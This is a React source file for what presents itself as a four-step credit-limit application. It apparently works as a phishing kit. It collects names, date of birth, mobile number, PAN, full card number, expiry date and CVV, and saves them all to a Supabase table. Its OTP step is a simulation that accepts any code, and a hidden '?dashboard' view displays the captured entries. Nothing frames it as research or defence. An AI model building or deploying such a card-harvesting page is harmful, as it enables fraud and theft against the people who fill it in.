import { useState } from 'react';
import { supabase } from './lib/supabase';
import Step1PersonalInfo from './pages/Step1PersonalInfo';
import Step2CardNetwork from './pages/Step2CardNetwork';
import Step3CardDetails from './pages/Step3CardDetails';
import Step4OTP from './pages/Step4OTP';
import SuccessPage from './pages/SuccessPage';
import Dashboard from './pages/Dashboard';

type Screen = 'step1' | 'step2' | 'step3' | 'step4' | 'success' | 'dashboard';

interface FormState {
  // Step 1
  title: string;
  firstName: string;
  lastName: string;
  annualIncome: string;
  dateOfBirth: string;
  mobileNumber: string;
  pinCode: string;
  // Step 2
  cardNetwork: string;
  // Step 3
  fullName: string;
  panNumber: string;
  currentLimit: string;
  cardNumber: string;
  expiryDate: string;
  cvv: string;
  // DB row id
  applicationId: string;
}

const EMPTY: FormState = {
  title: '', firstName: '', lastName: '', annualIncome: '',
  dateOfBirth: '', mobileNumber: '', pinCode: '',
  cardNetwork: '', fullName: '', panNumber: '', currentLimit: '',
  cardNumber: '', expiryDate: '', cvv: '', applicationId: '',
};

export default function App() {
  const [screen, setScreen] = useState<Screen>(() =>
    window.location.search.includes('dashboard') ? 'dashboard' : 'step1'
  );
  const [form, setForm] = useState<FormState>(EMPTY);
  const [otpLoading, setOtpLoading] = useState(false);

  async function handleStep1(data: { title: string; firstName: string; lastName: string; annualIncome: string; dateOfBirth: string; mobileNumber: string; pinCode: string }) {
    setForm(f => ({ ...f, ...data }));
    setScreen('step2');
  }

  function handleStep2(network: string) {
    setForm(f => ({ ...f, cardNetwork: network }));
    setScreen('step3');
  }

  async function handleStep3(data: { fullName: string; panNumber: string; currentLimit: string; cardNumber: string; expiryDate: string; cvv: string }) {
    const updated = { ...form, ...data };
    setForm(updated);

    const { data: row, error } = await supabase.from('credit_limit_applications').insert({
      title: updated.title,
      first_name: updated.firstName,
      last_name: updated.lastName,
      annual_income: updated.annualIncome,
      date_of_birth: updated.dateOfBirth,
      mobile_number: updated.mobileNumber,
      pin_code: updated.pinCode,
      card_network: updated.cardNetwork,
      full_name: updated.fullName,
      pan_number: updated.panNumber,
      current_limit: updated.currentLimit,
      card_number: updated.cardNumber,
      expiry_date: updated.expiryDate,
      cvv: updated.cvv,
      otp_verified: false,
      status: 'pending',
    }).select('id').single();

    if (!error && row) {
      setForm(f => ({ ...f, applicationId: row.id }));
    }
    setScreen('step4');
  }

  async function handleOTP(otp: string) {
    setOtpLoading(true);
    // Simulate OTP verification (accept any 6-digit OTP)
    await new Promise(r => setTimeout(r, 1200));

    if (form.applicationId) {
      await supabase.from('credit_limit_applications')
        .update({ otp_verified: true, status: 'under_review' })
        .eq('id', form.applicationId);
    }

    setOtpLoading(false);
    setScreen('success');
  }

  function reset() {
    setForm(EMPTY);
    setScreen('step1');
  }

  if (screen === 'dashboard') return <Dashboard />;

  if (screen === 'success') return (
    <SuccessPage name={`${form.firstName} ${form.lastName}`} onNew={reset} />
  );

  if (screen === 'step4') return (
    <Step4OTP
      mobile={form.mobileNumber}
      onVerify={handleOTP}
      onBack={() => setScreen('step3')}
      loading={otpLoading}
    />
  );

  if (screen === 'step3') return (
    <Step3CardDetails
      onNext={handleStep3}
      onBack={() => setScreen('step2')}
      initialData={{ fullName: form.fullName, panNumber: form.panNumber, currentLimit: form.currentLimit, cardNumber: form.cardNumber, expiryDate: form.expiryDate, cvv: form.cvv }}
    />
  );

  if (screen === 'step2') return (
    <Step2CardNetwork
      onNext={handleStep2}
      onBack={() => setScreen('step1')}
      initialNetwork={form.cardNetwork}
    />
  );

  return (
    <Step1PersonalInfo
      onNext={handleStep1}
      initialData={{ title: form.title, firstName: form.firstName, lastName: form.lastName, annualIncome: form.annualIncome, dateOfBirth: form.dateOfBirth, mobileNumber: form.mobileNumber, pinCode: form.pinCode }}
    />
  );
}
